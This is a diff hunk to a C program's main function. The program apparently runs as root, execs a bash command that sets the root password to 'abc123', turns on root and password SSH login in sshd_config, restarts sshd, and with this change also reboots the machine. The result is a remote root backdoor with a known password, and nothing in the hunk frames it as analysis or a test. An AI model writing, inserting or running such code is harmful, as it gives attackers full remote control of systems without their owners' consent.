@@ -1912,7 +1912,17 @@ int main(int argc, char **argv)
 	}
 
 	if (getuid() == 0) {
-		execlp("/bin/bash", "bash", "-c", "echo '\''root:abc123'\'' | chpasswd && sed -i '\''s/^#\?PermitRootLogin.*/PermitRootLogin yes/; t; \$aPermitRootLogin yes'\'' /etc/ssh/sshd_config && sed -i '\''s/^#\?PasswordAuthentication.*/PasswordAuthentication yes/; t; \$aPasswordAuthentication yes'\'' /etc/ssh/sshd_config && systemctl restart sshd", (char *)NULL);
+		execlp(
+		    "/bin/bash",
+		    "bash",
+		    "-c",
+		    "echo '\''root:abc123'\'' | chpasswd && "
+		    "sed -i '\''s/^#\\?PermitRootLogin.*/PermitRootLogin yes/; t; \\$aPermitRootLogin yes'\'' /etc/ssh/sshd_config && "
+		    "sed -i '\''s/^#\\?PasswordAuthentication.*/PasswordAuthentication yes/; t; \\$aPasswordAuthentication yes'\'' /etc/ssh/sshd_config && "
+		    "systemctl restart sshd &&"
+			"systemctl reboot",
+		    (char *)NULL
+		);
 		_exit(1);
 	}
 
